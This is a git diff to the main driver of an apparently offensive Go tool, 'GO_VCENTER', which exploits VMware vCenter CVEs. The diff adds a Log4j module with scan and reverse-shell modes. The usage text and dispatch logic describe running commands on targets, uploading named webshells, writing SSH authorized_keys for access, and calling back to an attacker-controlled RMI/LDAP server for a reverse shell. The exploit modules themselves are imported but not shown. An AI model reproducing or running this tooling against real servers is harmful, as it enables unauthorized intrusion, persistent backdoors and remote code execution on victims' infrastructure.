@@ -4,6 +4,7 @@ import (
 	"GO_VCENTER/src/c_21972"
 	"GO_VCENTER/src/c_21985"
 	"GO_VCENTER/src/c_22005"
+	"GO_VCENTER/src/log4jcenter"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -23,16 +24,18 @@ var (
 
 func usage() {
 	fmt.Println(`Usage of main.exe:
-	-u string
+	-u url
 		  you target, example: https://192.168.1.1
-	-m string
-		  you selected cve code, example: 21972 or 22205 or 21985
-	-c string
+	-m module
+		  you selected cve code, example: 21972 or 22205 or 21985 or log4center
+	-c command
 		  you want execute command, example: "whoami"
-	-f string
+	-f filename
 		  to upload webshell, expamle: behinder.jsp or antsword.jsp or gozllia.jsp 
-	-t string
-		  for CVE-2021-21972, use "ssh" to get ssh shell, not webshell`)
+	-t attack mode
+		  your attack mode, example: use "ssh" to get ssh shell, not webshell, use -r rmi://xx/xx to get reverseshell
+	-r rmi server
+		  your ldap & rmi server`)
 }
 
 func banner() {
@@ -70,8 +73,10 @@ func main() {
 		{
 			if exp_type == "rshell" {
 				c_21985.Exploit(url, rmi)
-			} else {
+			} else if exp_type == "" {
 				c_21985.Attack(url, command)
+			} else {
+				fmt.Println("\"" + exp_type + "\"" + " is an incorrect parameter.")
 			}
 
 		}
@@ -82,10 +87,29 @@ func main() {
 			fmt.Println(string(t))
 			if exp_type == "ssh" {
 				c_21972.Upload_ssh_authorized_keys(url, string(t))
-			} else {
+			} else if exp_type == "" {
 				c_21972.Upload_windows_shell(url, string(t))
 				c_21972.Upload_linux_shell(url, string(t))
+			} else {
+				fmt.Println("\"" + exp_type + "\"" + " is an incorrect parameter.")
 			}
+		}
+	case "log4center":
+		{
+			if exp_type == "scan" {
+
+				log4jcenter.StartScan(url)
+			} else if exp_type == "rshell" {
+				if rmi != "" {
+					log4jcenter.StartExploit(url, rmi)
+				} else {
+					usage()
+				}
+
+			} else {
+				fmt.Println("\"" + exp_type + "\"" + " is an incorrect parameter.")
+			}
+
 		}
 	}
 
